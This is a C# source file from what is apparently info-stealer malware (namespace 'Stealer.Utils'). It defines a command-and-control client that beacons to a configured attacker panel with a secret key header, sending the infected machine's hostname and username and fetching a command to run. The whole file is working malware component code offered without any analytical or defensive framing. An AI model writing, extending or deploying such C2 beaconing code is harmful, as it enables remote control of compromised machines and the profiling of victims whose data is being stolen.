using System;
using System.Net;
using System.Text;

namespace Stealer.Utils
{
    public static class C2Client
    {
        private static string _baseUrl;

        private static string BaseUrl
        {
            get
            {
                if (_baseUrl != null) return _baseUrl;
                Config.Initialize();
                string url = Config.PanelUrl.TrimEnd('/');
                int idx = url.LastIndexOf("/api/upload");
                if (idx > 0) url = url.Substring(0, idx);
                _baseUrl = url;
                return _baseUrl;
            }
        }

        public static string PollCommand(string clientId)
        {
            var wc = new WebClient();
            if (!string.IsNullOrEmpty(Config.SecretKey))
                wc.Headers["x-panel-key"] = Config.SecretKey;

            string url = BaseUrl + "/api/c2/command?client_id=" + Uri.EscapeDataString(clientId)
                + "&hostname=" + Uri.EscapeDataString(Environment.MachineName)
                + "&username=" + Uri.EscapeDataString(Environment.UserName);

            string body = wc.DownloadString(url);
            return ParseJsonKey(body, "command");
        }

        private static string Escape(string s)
        {
            if (s == null) return "";
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"");
        }

        private static string ParseJsonKey(string json, string key)
        {
            string search = "\"" + key + "\":\"";
            int start = json.IndexOf(search);
            if (start < 0) return null;
            start += search.Length;
            int end = json.IndexOf("\"", start);
            if (end <= start) return null;
            return json.Substring(start, end - start);
        }
    }
}
